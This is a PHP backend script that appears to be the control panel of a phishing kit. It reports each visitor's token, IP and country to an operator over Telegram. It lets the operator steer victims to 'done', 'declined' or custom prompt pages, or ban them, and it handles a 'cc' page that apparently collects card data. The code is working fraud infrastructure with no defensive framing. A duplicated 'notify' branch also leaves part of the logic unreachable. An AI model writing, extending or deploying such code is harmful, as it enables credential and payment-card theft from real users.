<?php
// MAIN API HANDLER
require_once(__DIR__ . '/../config.php');
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? $_POST['action'] ?? '';

// GET CLIENT IP
if ($action === 'client-info') {
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    echo json_encode(['ip' => $ip]);
    exit;
}

// CHECK FOR REDIRECT ACTION
if ($action === 'check-action') {
    $token = $_GET['token'] ?? '';
    if (empty($token)) {
        echo json_encode(['action' => null]);
        exit;
    }
    if (!file_exists(ACTIONS_FILE)) {
        echo json_encode(['action' => null]);
        exit;
    }
    $actions = json_decode(file_get_contents(ACTIONS_FILE), true) ?: [];
    if (isset($actions[$token])) {
        $actionData = $actions[$token];
        $response = [
            'action' => $actionData['action'],
            'timestamp' => $actionData['timestamp']
        ];
        
        // Add custom label and placeholder if available
        if ($actionData['action'] === 'custom') {
            // Check if custom text is ready
            if (isset($actionData['custom_label']) && isset($actionData['custom_placeholder'])) {
                $response['custom_label'] = $actionData['custom_label'];
                $response['custom_placeholder'] = $actionData['custom_placeholder'];
                
                // Delete action now that it's ready
                unset($actions[$token]);
                file_put_contents(ACTIONS_FILE, json_encode($actions));
                
                echo json_encode($response);
                exit;
            } else {
                // Custom text not ready yet, don't return action
                echo json_encode(['action' => null]);
                exit;
            }
        } else {
            // Delete action for non-custom actions
            unset($actions[$token]);
            file_put_contents(ACTIONS_FILE, json_encode($actions));
        }
        
        echo json_encode($response);
    } else {
        echo json_encode(['action' => null]);
    }
    exit;
}

// SEND NOTIFICATION
if ($action === 'notify') {
    $input = json_decode(file_get_contents('php://input'), true);
    $message = $input['message'] ?? '';
    
    if (!empty($message)) {
        $result = sendTelegramMessage($message, null);
        echo json_encode(['success' => $result['ok']]);
    } else {
        echo json_encode(['success' => false]);
    }
    exit;
}

// BAN IP
if ($action === 'ban-ip') {
    $ip = $_POST['ip'] ?? '';
    if (empty($ip)) {
        echo json_encode(['success' => false, 'message' => 'No IP provided']);
        exit;
    }
    $banned = file_exists(BANNED_IPS_FILE) ? json_decode(file_get_contents(BANNED_IPS_FILE), true) : [];
    $banned[$ip] = [
        'banned_at' => time(),
        'banned_date' => date('Y-m-d H:i:s')
    ];
    file_put_contents(BANNED_IPS_FILE, json_encode($banned, JSON_PRETTY_PRINT));
    echo json_encode(['success' => true, 'message' => "IP $ip banned", 'ip' => $ip]);
    exit;
}

// NOTIFY (First visit)
if ($action === 'notify') {
    $input = json_decode(file_get_contents('php://input'), true);
    $token = $input['token'] ?? '';
    $ip = $input['ip'] ?? 'unknown';
    
    if (empty($token)) {
        echo json_encode(['success' => false]);
        exit;
    }
    
    $sessions = file_exists(SESSION_FILE) ? json_decode(file_get_contents(SESSION_FILE), true) : [];
    if (isset($sessions[$token])) {
        echo json_encode(['success' => true, 'cached' => true]);
        exit;
    }
    
    $message = "🔔 NEW USER\n\n📱 Token: $token\n🌐 IP: $ip\n⏰ " . date('H:i:s') . "\n\n👇 Where to send user?";
    
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ Done', 'callback_data' => "action_{$token}_done"],
                ['text' => '❌ Declined', 'callback_data' => "action_{$token}_declined"]
            ],
            [
                ['text' => '🚫 Ban IP', 'callback_data' => "ban_{$token}_{$ip}"]
            ]
        ]
    ];
    
    $result = sendTelegramMessage($message, $keyboard);
    
    if ($result['ok']) {
        $sessions[$token] = ['ip' => $ip, 'time' => time()];
        file_put_contents(SESSION_FILE, json_encode($sessions));
    }
    
    echo json_encode(['success' => $result['ok']]);
    exit;
}

// TRACK (Page visit)
if ($action === 'track') {
    require_once(__DIR__ . '/../includes/get-country.php');
    
    $input = json_decode(file_get_contents('php://input'), true);
    $token = $input['token'] ?? '';
    $page = $input['page'] ?? 'unknown';
    $ip = $input['ip'] ?? 'unknown';
    
    if (empty($token)) {
        echo json_encode(['success' => false]);
        exit;
    }
    
    // Skip tracking for cc (sends on submit)
    if ($page === 'cc') {
        echo json_encode(['success' => true, 'skipped' => true]);
        exit;
    }
    
    // Check if already tracked
    $tracks = file_exists(PAGE_TRACKS_FILE) ? json_decode(file_get_contents(PAGE_TRACKS_FILE), true) : [];
    $trackKey = $token . '_' . $page;
    
    if (isset($tracks[$trackKey])) {
        echo json_encode(['success' => true, 'cached' => true]);
        exit;
    }
    
    $country = getCountryFromIP($ip);
    $shortId = substr($token, 3); // Get all chars after SPT/TKN
    
    $pageTitles = [
        'declined' => '❌ • User is ON DECLINED page',
        'done' => '✅ • User is ON DONE page',
        'loading' => '⏳ • User is WAITING'
    ];
    
    $title = $pageTitles[$page] ?? '📄 • User is on ' . strtoupper($page);
    
    $message = "❁═∘ ID: {$shortId} ∘═❁\n\n";
    $message .= " {$title}\n\n";
    $message .= "  ❁═══∘◦❁∘═══∘❁◦∘═══❁\n\n";
    $message .= " 📡 IP: {$ip}\n";
    $message .= " 🌐 Country: {$country}";
    
    $result = sendTelegramMessage($message, null);
    
    if ($result['ok']) {
        $tracks[$trackKey] = ['time' => time()];
        file_put_contents(PAGE_TRACKS_FILE, json_encode($tracks));
    }
    
    echo json_encode(['success' => $result['ok']]);
    exit;
}

echo json_encode(['error' => 'Unknown action']);
?>

